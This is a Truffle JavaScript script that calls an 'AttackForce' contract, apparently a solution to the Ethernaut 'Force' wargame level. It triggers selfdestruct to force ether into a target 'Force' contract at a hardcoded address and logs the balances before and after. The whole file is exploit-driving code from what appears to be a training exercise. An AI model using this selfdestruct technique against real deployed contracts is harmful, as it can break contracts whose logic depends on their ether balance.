const AttackForce = artifacts.require("AttackForce");
const Force = artifacts.require("Force");

module.exports = async function (callback) {
  try {
    const accounts = await web3.eth.getAccounts();
    const attacker = accounts[0]; // Assuming the first account is the attacker
    const forceAddress = "0xfa24b53056aa2c93F95FCE37326602Cb1b777546"; // Target Force contract address

    // Get the deployed instance of the AttackForce contract
    const attackInstance = await AttackForce.deployed();
    console.log(
      `Attack contract deployed at address: ${attackInstance.address}`
    );

    // Check the balance of the AttackForce contract
    const deployedBalance = await web3.eth.getBalance(attackInstance.address);
    console.log(
      `Attack contract deployed with: ${web3.utils.fromWei(
        deployedBalance,
        "ether"
      )} ETH`
    );

    // Call the attack function to trigger selfdestruct
    const tx = await attackInstance.attack({ from: attacker });
    console.log(`Attack transaction sent: ${tx.tx}`);

    // Check the balance of the Force contract after selfdestruct
    const forceBalance = await web3.eth.getBalance(forceAddress);
    console.log(
      `After attack selfdestruct, Force contract balance is: ${web3.utils.fromWei(
        forceBalance,
        "ether"
      )} ETH`
    );

    callback();
  } catch (error) {
    console.error("Error during attack:", error);
    callback(error);
  }
};
